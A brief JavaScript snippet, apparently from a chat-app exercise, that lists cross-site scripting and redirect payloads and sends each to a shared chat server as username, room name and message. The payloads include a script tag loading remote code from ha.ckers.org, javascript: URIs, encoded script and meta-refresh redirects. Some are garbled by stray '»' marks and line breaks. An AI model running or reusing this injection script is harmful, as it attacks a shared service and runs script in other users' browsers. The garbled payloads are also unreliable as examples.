

var evilmsgs = ['<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
'<IMG SRC="javascript:alert(\'XSS\');">',
"<meta http-equiv=\"refresh\" content=\"0; url=http://devbootcamp.com/\" />",
"<br><meta http-equiv=\"refresh\" content=\"0; url=http://devbootcamp.com/\" /><br>",
"<IFRAME » SRC=\"javascript:alert(\'Courtesy of your mom\') »;\"></IFRAME>",
'<!--[if gte IE »4]><SCRIPT>alert(\'XSS\');</S »CRIPT><![endif]-->',
'<IMG »
SRC=&#x6A&#x61&#x76&#x61&#x7 »
3&#x63&#x72&#x69&#x70&#x74&# »
x3A&#x61&#x6C&#x65&#x72&#x74 »
&#x28&#x27&#x58&#x53&#x53&#x »
27&#x29>',
'<? »echo(\'<SCR)\';
echo(\'IPT>aler »
t("XSS")</SCRIPT>\'); ?>'

]

for (var i = 0; i < evilmsgs.length; i++) {
  app.send({username:evilmsgs[i],roomname:evilmsgs[i], text:evilmsgs[i]});
}
